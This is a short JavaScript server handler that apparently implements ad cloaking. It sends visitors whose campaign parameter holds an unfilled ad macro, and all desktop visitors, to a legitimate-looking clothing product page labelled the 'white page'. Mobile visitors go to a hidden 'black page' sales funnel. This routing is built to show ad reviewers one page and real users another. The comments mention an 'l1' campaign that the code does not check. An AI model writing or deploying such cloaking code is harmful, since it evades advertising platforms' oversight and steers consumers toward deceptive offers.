export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://urban-maple.com/products/xavier-patchwork-vanguard-sweater?variant=55466503700829&country=CA&currency=CAD&utm_medium=product_sync&utm_source=google&utm_content=sag_organic&utm_campaign=sag_organic&utm_campaign=21956401326&utm_ad_group=&utm_ad=&utm_source=google&gad_source=1&gclid=EAIaIQobChMI4OOyt7eliwMViB6tBh0oSgteEAQYBCABEgKyovD_BwE";
    const blackPageURL = "https://dnfiwbzxjq.myfunnelish.com/imbassd-1736979042571105-1737834191248667";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
